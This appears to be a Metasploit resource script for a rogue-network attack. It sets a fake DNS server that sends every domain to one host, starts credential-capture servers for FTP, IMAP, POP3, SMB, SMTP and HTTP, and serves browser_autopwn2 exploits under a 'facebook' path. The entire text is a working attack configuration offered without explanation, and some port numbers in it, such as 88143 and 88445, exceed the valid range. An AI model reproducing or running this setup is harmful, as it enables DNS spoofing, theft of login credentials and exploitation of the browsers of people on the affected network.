# service smbd stop
# service apache2 stop
# run.py -r 80:8880,443:8880,53:8853,143:88143,110:88110,445:88445,25:8825

use auxiliary/server/fakedns
set SRVPORT 8853
set TARGETACTION FAKE
set TARGETDOMAIN *
set TARGETHOST 192.168.43.30
run

use auxiliary/server/capture/ftp
run

use auxiliary/server/capture/imap
set SRVPORT 88143
set SSL true
run

use auxiliary/server/capture/pop3
set SRVPORT 88110
set SSL true
run

use auxiliary/server/capture/smb
set SRVPORT 88445
run

use auxiliary/server/capture/smtp
set SRVPORT 8825
set SSL true
run

use auxiliary/server/browser_autopwn2
set SRVPORT 8889
set URIPATH facebook
run

use auxiliary/server/capture/http
set AUTOPWN_HOST localhost
set AUTOPWN_PORT 8889
set AUTOPWN_URI facebook
set SRVPORT 8880
run
